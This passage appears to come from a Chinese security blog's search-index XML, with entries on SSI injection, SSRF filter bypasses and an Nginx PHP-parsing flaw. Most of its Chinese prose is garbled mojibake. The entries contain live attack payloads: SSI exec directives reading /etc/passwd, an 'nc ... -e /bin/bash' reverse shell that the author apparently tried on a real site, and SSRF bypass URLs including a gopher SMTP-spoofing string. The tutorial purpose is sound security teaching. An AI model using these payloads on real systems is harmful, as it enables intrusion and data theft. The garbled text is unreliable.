é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥ã€‚1234567891011121314151617181920212223242526272829303132333435361ã€æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt;æœ¬æ–‡æ¡£åç§°ï¼š&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt;ç°åœ¨æ—¶é—´ï¼š&lt;!â€“#echo var=&quot;DATE_LOCAL&quot;â€“&gt;æ˜¾ç¤ºIPåœ°å€&lt;/ins&gt;&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt;2ã€å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt;&lt;! #include file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;æ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„3ã€æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯&lt;#flastmod&gt;&lt;#fsize&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰)æ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š&lt;! #flastmod file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;æ–‡ä»¶çš„é•¿åº¦ï¼š&lt;!â€“#fsize file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;4ã€ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt;(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº)&lt;!â€“#exec cmd=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!â€“#exec cgi=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgiå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚5ã€è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼&lt;#config&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼)6ã€é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚ æ›´å¤šè¯·å‚è€ƒï¼šhttp://www.javaeye.com/topic/306216 0x02 æ¼æ´åœºæ™¯åœ¨å¾ˆå¤šä¸šåŠ¡ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå­˜åœ¨åå°„å‹XSSæ¼æ´çš„é¡µé¢ï¼Œå¦‚æœè¾“å…¥çš„payloadä¸æ˜¯XSSä»£ç è€Œæ˜¯SSIçš„æ ‡ç­¾ï¼ŒåŒæ—¶æœåŠ¡å™¨åˆå¼€å¯äº†å¯¹SSIçš„æ”¯æŒçš„è¯å°±ä¼šå­˜åœ¨SSIæ¼æ´ã€‚ ä»å®šä¹‰ä¸­çœ‹å‡ºï¼Œé¡µé¢ä¸­æœ‰ä¸€å°éƒ¨åˆ†æ˜¯åŠ¨æ€è¾“å‡ºçš„æ—¶å€™ä½¿ç”¨SSIï¼Œæ¯”å¦‚ï¼š1234æ–‡ä»¶ç›¸å…³çš„å±æ€§å­—æ®µå½“å‰æ—¶é—´è®¿å®¢IPè°ƒç”¨CGIç¨‹åº 0x03 SSIæ³¨å…¥çš„æ¡ä»¶å½“ç¬¦åˆä¸‹åˆ—æ¡ä»¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ Web æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤ï¼š Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰ Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤ Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥ SSIæ³¨å…¥å¸¸ç”¨å‘½ä»¤ï¼š https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection 0x04 SSIæŒ–æ˜æ€è·¯ä¸¤ä¸ªæ€è·¯ï¼š ä»ä¸šåŠ¡åœºæ™¯æ¥Fuzzï¼Œæ¯”å¦‚è·å–IPã€å®šä½ã€æ—¶é—´ç­‰ è¯†åˆ«é¡µé¢æ˜¯å¦åŒ…å«.stm,.shtmå’Œ.shtmlåç¼€ google dorkï¼šinurl:bin/cklb 0x05 SSIæ¼æ´å¤ç°5.1 æœ¬åœ°æµ‹è¯•æˆ‘ä»¬ä½¿ç”¨bWAPPæ¥åšæ¼æ´æ¼”ç¤ºç¯å¢ƒé€‰æ‹©ï¼šServer-Side Includes (SSI) Injectionè¾“å…¥ä¸ªXSSçš„payloadï¼š&lt;script&gt;alert(1)&lt;/script&gt;æˆåŠŸæ‰§è¡Œäº†ä»£ç ã€‚ å†ä½¿ç”¨ä¸‹execæŒ‡ä»¤ä½¿ç”¨cmdä½œä¸ºå‚æ•°æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤ï¼š&lt;!--#exec cmd=&quot;ls -al&quot;--&gt; 5.2 æ¼æ´æŒ–æ˜è¿æ°”å¥½ï¼Œåˆšå¥½é‡åˆ°ä¸ªå¾®åšçš„ã€‚1&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; 1&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt; 0x06 SSIé˜²å¾¡ å…³é—­æœåŠ¡å™¨SSIåŠŸèƒ½ è¿‡æ»¤ç›¸å…³SSIç‰¹æ®Šå­—ç¬¦ï¼ˆ&lt;,&gt;,#,-,&quot;,&#39;ï¼‰ å…·ä½“è¯·å‚è€ƒï¼šSSI æ³¨å…¥çš„ä»‹ç»å’Œä»£ç é˜²å¾¡ å‚è€ƒï¼šhttp://m.jb51.net/article/25725.htm http://www.kubiji.cn/topic-id998.html https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection http://www.mottoin.com/101526.html http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/ http://blog.csdn.net/qq_29277155/article/details/52751364]]></content>
      <tags>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>æ¼æ´æŒ–æ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRFç»•è¿‡æ–¹æ³•æ€»ç»“]]></title>
    <url>%2F2017%2F11%2F21%2FSSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ˜¨å¤©å¿˜äº†åœ¨å…¬ä¼—å·è¿˜æ˜¯å¾®åšä¸Šçœ‹åˆ°çš„äº†ï¼Œçœ‹åˆ°ä¸€ä¸ªSSRFç»•è¿‡çš„æŠ€å·§ï¼Œä½¿ç”¨çš„æ˜¯â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œç»•è¿‡çš„ï¼Œè‡ªå·±ä¹Ÿæ²¡é‡åˆ°è¿‡ã€‚ç„¶åæƒ³æƒ³è‡ªå·±å¯¹SSRFç»•è¿‡è¿˜æ˜¯åœç•™åœ¨ä¹‹å‰çš„äº†è§£ï¼Œä¹Ÿæ²¡å­¦ä¹ è¿‡æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œæ‰€ä»¥ç‰¹æ„æ‰¾äº†æ‰¾èµ„æ–™ï¼Œå­¦ä¹ å­¦ä¹ æœ€æ–°é»‘ç§‘æŠ€ï¼Œå……å……èƒ½ã€‚ 0x00 SSRFæ˜¯ä»€ä¹ˆèƒ½ç²¾ç®€çš„å°±ä¸æ‰¯æ·¡ï¼Œä¸€å¥è¯å°±æ˜¯ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡ã€‚ 0x01 SSRFèƒ½å¹²ä»€ä¹ˆ æ¢æµ‹å†…ç½‘ä¿¡æ¯ æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡ ç©¿é€é˜²ç«å¢™ ã€‚ã€‚ã€‚ 0x02 SSRFæ€ä¹ˆæ‰¾ èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹ æ•°æ®åº“å†…ç½®åŠŸèƒ½ é‚®ä»¶ç³»ç»Ÿ æ–‡ä»¶å¤„ç† åœ¨çº¿å¤„ç†å·¥å…· ã€‚ã€‚ã€‚ ä¸¾å‡ ä¸ªä¾‹å­ï¼š åœ¨çº¿è¯†å›¾ï¼Œåœ¨çº¿æ–‡æ¡£ç¿»è¯‘ï¼Œåˆ†äº«ï¼Œè®¢é˜…ç­‰ï¼Œè¿™äº›æœ‰çš„éƒ½ä¼šå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚ æ ¹æ®è¿œç¨‹URLä¸Šä¼ ï¼Œé™æ€èµ„æºå›¾ç‰‡ç­‰ï¼Œè¿™äº›ä¼šè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨çš„èµ„æºã€‚ æ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°ï¼Œè¿™ç‚¹çœ‹çŒªçŒªä¾ è®²çš„å§ï¼Œæ²¡å®è·µè¿‡ã€‚ é‚®ä»¶ç³»ç»Ÿå°±æ˜¯æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€è¿™äº›åœ°æ–¹ã€‚ æ–‡ä»¶å°±æ‰¾ImageMagickï¼Œxmlè¿™äº›ã€‚ ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼Œæ¯”å¦‚ï¼šsource,share,link,src,imageurl,targetç­‰ã€‚ ä»¥ä¸Šè¿™äº›ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œä¸‹é¢è¯´ä¸‹é‡ç‚¹ä»‹ç»çš„SSRFç»•è¿‡çš„æ–¹æ³•ã€‚ 0x03 SSRFæ€ä¹ˆç»•1ã€æ”»å‡»æœ¬åœ°12http://127.0.0.1:80http://localhost:22 2ã€åˆ©ç”¨[::]123åˆ©ç”¨[::]ç»•è¿‡localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1ä¹Ÿæœ‰çœ‹åˆ°åˆ©ç”¨http://0000::1:80/çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æœªæˆåŠŸ 3ã€åˆ©ç”¨@1http://example.com@127.0.0.1 4ã€åˆ©ç”¨çŸ­åœ°å€1http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 5ã€åˆ©ç”¨ç‰¹æ®ŠåŸŸååˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ1http://127.0.0.1.xip.io/ 1http://www.owasp.org.127.0.0.1.xip.io/ 6ã€åˆ©ç”¨DNSè§£æ1åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1 7ã€åˆ©ç”¨ä¸Šä¼ 1234ä¹Ÿä¸ä¸€å®šæ˜¯ä¸Šä¼ ï¼Œæˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œè‡ªå·±ä½“ä¼š -.-ä¿®æ”¹&quot;type=file&quot;ä¸º&quot;type=url&quot;æ¯”å¦‚ï¼šä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF 8ã€åˆ©ç”¨Enclosed alphanumerics1234åˆ©ç”¨Enclosed alphanumericsâ“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ &gt;&gt;&gt; example.comList:â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿ 9ã€åˆ©ç”¨å¥å·1127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.1 10ã€åˆ©ç”¨è¿›åˆ¶è½¬æ¢12345å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚115.239.210.26 &gt;&gt;&gt; 16373751032é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1aç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0 è·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x 1http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ 1http://127.0.0.1 &gt;&gt;&gt; http://2130706433/ 12http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 11ã€åˆ©ç”¨ç‰¹æ®Šåœ°å€1http://0/ 12ã€åˆ©ç”¨åè®®1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13ã€ä½¿ç”¨ç»„åˆå„ç§ç»•è¿‡çš„ç»„åˆå³å¯ å‚è€ƒé“¾æ¥ï¼šhttps://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>CTF</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginxè§£ææ¼æ´åŸç†åˆ†æ]]></title>
    <url>%2F2017%2F11%2F09%2FNginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 æ¼æ´æè¿°æ¼æ´ä»‹ç»ï¼šnginxæ˜¯ä¸€æ¬¾é«˜æ€§èƒ½çš„webæœåŠ¡å™¨ï¼Œä½¿ç”¨éå¸¸å¹¿æ³›ï¼Œå…¶ä¸ä»…ç»å¸¸è¢«ç”¨ä½œåå‘ä»£ç†ï¼Œä¹Ÿå¯ä»¥éå¸¸å¥½çš„æ”¯æŒPHPçš„è¿è¡Œã€‚Nginx&lt;8.03é»˜è®¤æƒ…å†µä¸‹å¯èƒ½å¯¼è‡´æœåŠ¡å™¨é”™è¯¯çš„å°†ä»»ä½•ç±»å‹çš„æ–‡ä»¶ä»¥PHPçš„æ–¹å¼è¿›è¡Œè§£æï¼Œè¿™å°†å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œä½¿å¾—æ¶æ„çš„æ”»å‡»è€…å¯èƒ½æ”»é™·æ”¯æŒphpçš„nginxæœåŠ¡å™¨ã€‚ 0x02 æ¦‚å¿µä»‹ç»0x21 CGICGIæ˜¯è§„å®šweb serverä¼ é€’è¿‡æ¥çš„æ•°æ®æ˜¯ä½•ç§æ ‡å‡†æ ¼å¼ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªåè®®ã€‚web server(ä¾‹å¦‚nginx)åªæ˜¯å†…å®¹çš„åˆ†å‘è€…ã€‚æ¯”å¦‚ï¼š 1234567891) å¦‚æœè¯·æ±‚/index.htmlï¼Œé‚£ä¹ˆweb serverä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œè¿™é‡Œåˆ†å‘çš„æ˜¯é™æ€æ•°æ®2) å¦‚æœè¯·æ±‚çš„æ˜¯/index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ï¼ŒnginxçŸ¥é“è¿™ä¸ªä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œéœ€è¦å»æ‰¾PHPè§£æå™¨æ¥å¤„ç†ï¼Œé‚£ä¹ˆä»–ä¼šæŠŠè¿™ä¸ªè¯·æ±‚ç®€å•å¤„ç†åäº¤ç»™PHPè§£æå™¨é—®é¢˜çš„æ ¸å¿ƒåœ¨äºNginxéœ€è¦ä¼ å“ªäº›æ•°æ®ç»™PHPè§£æå™¨å‘¢ï¼Œä¾‹å¦‚ï¼š1) url2) æŸ¥è¯¢å­—ç¬¦ä¸²3) POSTæ•°æ®4) HTTP header... æ‰€ä»¥ï¼ŒCGIæœ¬è´¨ä¸Šå°±æ˜¯è§„å®šè¦ä¼ å“ªäº›æ•°æ®ã€ä»¥ä»€ä¹ˆæ ·çš„æ ¼å¼ä¼ é€’ç»™åæ–¹å¤„ç†è¿™ä¸ªè¯·æ±‚çš„åè®®ã€‚ 0x22 FastCGIFastCGIé¡¾åæ€ä¹‰ä¹Ÿæ˜¯CGIçš„ä¸€ä¸ªåè®®ï¼ŒFastCGIåªæ˜¯ä¼˜åŒ–äº†CGIç¨‹åºçš„æ€§èƒ½12341) é¦–å…ˆï¼ŒFastcgiä¼šå…ˆå¯ä¸€ä¸ªmasterï¼Œè§£æé…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒ2) ç„¶åå†å¯åŠ¨å¤šä¸ªworker3) å½“è¯·æ±‚è¿‡æ¥æ—¶ï¼Œmasterä¼šä¼ é€’ç»™ä¸€ä¸ªworkerï¼Œç„¶åç«‹å³å¯ä»¥æ¥å—ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±é¿å…äº†é‡å¤çš„åŠ³åŠ¨ï¼Œæ•ˆç‡æé«˜äº†4) è€Œä¸”å½“workerä¸å¤Ÿç”¨æ—¶ï¼Œmasterå¯ä»¥æ ¹æ®é…ç½®é¢„å…ˆå¯åŠ¨å‡ ä¸ªworkerç­‰ç€ï¼ŒåŒæ—¶å¦‚æœå‘ç°ç©ºé—²workerå¤ªå¤šæ—¶ï¼Œä¹Ÿä¼šåœæ‰ä¸€äº›ï¼Œè¿™æ ·å°±æé«˜äº†æ€§èƒ½ï¼Œä¹ŸèŠ‚çº¦äº†èµ„æº 0x23 PHP-CGI/PHP-FastCGIPHPçš„è§£é‡Šå™¨æ˜¯PHP-CGIï¼ŒPHP-CGIåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç† 0x24 PHP-FPMPHP-FPMæ˜¯PHP-CGIè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œç”¨æ¥ç®¡ç†PHP-CGIè¿›ç¨‹çš„ï¼ŒPHP-FPMçš„ç®¡ç†å¯¹è±¡æ˜¯PHP-CGI 0x03 æ¼æ´åˆ†ænginxé»˜è®¤ä»¥cgiçš„æ–¹å¼æ”¯æŒphpçš„è¿è¡Œï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­å¦‚ä¸‹é…ç½®: 12345678location ~ .php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params;&#125; é…ç½®å‚æ•°è¯´æ˜å¦‚ä¸‹ 1234567891011121314151. locationå¯¹è¯·æ±‚è¿›è¡Œé€‰æ‹©çš„æ—¶å€™ä¼šä½¿ç”¨URIç¯å¢ƒå˜é‡è¿›è¡Œé€‰æ‹© 1) å…¶ä¸­ä¼ é€’åˆ°åç«¯Fastcgiçš„å…³é”®å˜é‡SCRIPT_FILENAMEç”±nginxç”Ÿæˆçš„$fastcgi_script_nameå†³å®š 2) è€Œé€šè¿‡åˆ†æå¯ä»¥çœ‹åˆ°$fastcgi_script_nameæ˜¯ç›´æ¥ç”±URIç¯å¢ƒå˜é‡æ§åˆ¶çš„2. è¿™é‡Œå°±æ˜¯äº§ç”Ÿé—®é¢˜çš„ç‚¹ã€‚è€Œä¸ºäº†è¾ƒå¥½çš„æ”¯æŒPATH_INFOçš„æå–ï¼Œåœ¨PHPçš„é…ç½®é€‰é¡¹é‡Œå­˜åœ¨cgi.fix_pathinfoé€‰é¡¹ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†ä»SCRIPT_FILENAMEé‡Œå–å‡ºçœŸæ­£çš„è„šæœ¬å æˆ‘ä»¬æ¥å‡è®¾ä¸€ä¸ªæ”»å‡»åœºæ™¯: 1. å‡è®¾å­˜åœ¨ä¸€ä¸ªURL: http://localhost/test/test.jpg 2. æˆ‘ä»¬ä»¥å¦‚ä¸‹çš„æ–¹å¼å»è®¿é—®: http://localhost/test/test.jpg/test.php 3. nginxå°†ä¼šå¾—åˆ°ä¸€ä¸ªURI: /test.jpg/test.php 4. ç»è¿‡locationæŒ‡ä»¤ï¼Œè¯¥è¯·æ±‚å°†ä¼šäº¤ç»™åç«¯çš„fastcgiå¤„ç†ï¼Œnginxä¸ºå…¶è®¾ç½®ç¯å¢ƒå˜é‡SCRIPT_FILENAMEï¼Œå†…å®¹ä¸º: /scripts/test.jpg/test.php 5. åç«¯çš„fastcgiåœ¨æ¥å—åˆ°è¯¥é€‰é¡¹æ—¶ï¼Œä¼šæ ¹æ®fix_pathinfoé…ç½®å†³å®šæ˜¯å¦å¯¹SCRIPT_FILENAMEè¿›è¡Œé¢å¤–çš„å¤„ç†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¦‚æœä¸å¯¹fix_pathinfoè¿›è¡Œè®¾ç½®å°†å½±å“ä½¿ç”¨PATH_INFOè¿›è¡Œè·¯ç”±é€‰æ‹©çš„åº”ç”¨ï¼Œæ‰€ä»¥è¯¥é€‰é¡¹ä¸€èˆ¬é…ç½®å¼€å¯ã€‚phpé€šè¿‡è¯¥é€‰é¡¹ä¹‹åå°†æŸ¥æ‰¾å…¶ä¸­çœŸæ­£çš„è„šæœ¬æ–‡ä»¶åå­—ï¼ŒæŸ¥æ‰¾çš„æ–¹å¼ä¹Ÿæ˜¯æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªæ—¶å€™å°†åˆ†ç¦»å‡ºSCRIPT_FILENAMEå’ŒPATH_INFOåˆ†åˆ«ä¸º 1) SCRIPT_FILENAME: /scripts/test.jpg 2) PATH_INFO: test.php 6. æœ€åï¼Œä»¥/scripts/test.jpgä½œä¸ºæ­¤æ¬¡è¯·æ±‚éœ€è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œè€Œnginxä¼šä½¿ç”¨phpè§£æå™¨æ¥å¤„ç†è¿™ä¸ªjpgæ–‡ä»¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥å®ç°è®©nginxä»¥phpæ¥è§£æä»»ä½•ç±»å‹çš„æ–‡ä»¶äº† æ‰€ä»¥ï¼Œæ¼æ´çš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯ç”±äºfcgiå’Œweb serverå¯¹scriptè·¯å¾„çº§å‚æ•°çš„ç†è§£ä¸åŒå‡ºç°çš„é—®é¢˜ï¼Œè¿™æ˜¯å…¸å‹çš„å› ä¸ºè·¨ç³»ç»Ÿè¯­å¢ƒä¸åŒå¯¼è‡´å¯¹åŒä¸€ä¸ªè¯·æ±‚çš„ä¸åŒè§£é‡Šå¯¼è‡´çš„æ¼æ´ï¼Œå®ƒçš„æ”»å‡»é¢æ˜¯å¸¦æœ‰è¿™ç§æ¼æ´çš„nginx 0x04: ä¿®å¤æ–¹æ¡ˆ ä¿®æ”¹php.inié…ç½® 1cgi.fix_pathinfo = 0 nginxé…ç½®æ–‡ä»¶ä¸­æ·»åŠ 1234567891011if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403;&#125;/*è€ƒè™‘åˆ°MVCæ¡†æ¶ã€ç”¨æˆ·è‡ªå®šä¹‰ç«™ç‚¹ä¸­æœ‰å¯èƒ½å‡ºç°xxx/xx.phpçš„æƒ…å†µï¼Œè¿™ä¸ªè§„åˆ™åº”è¯¥æ›´åŠ ç»†ç²’åº¦ä¸€ç‚¹ï¼Œä¾‹å¦‚*.jpg/.*phpã€*.txt/.*php*/å¦å¤–ï¼Œnginxå¯ä»¥åœ¨ä¸éœ€è¦é‡å¯çš„æƒ…å†µï¼Œhotreloadé…ç½®æ–‡ä»¶service nginx reload //or /etc/init.d/nginx reload å‚è€ƒæ–‡ç« ï¼š 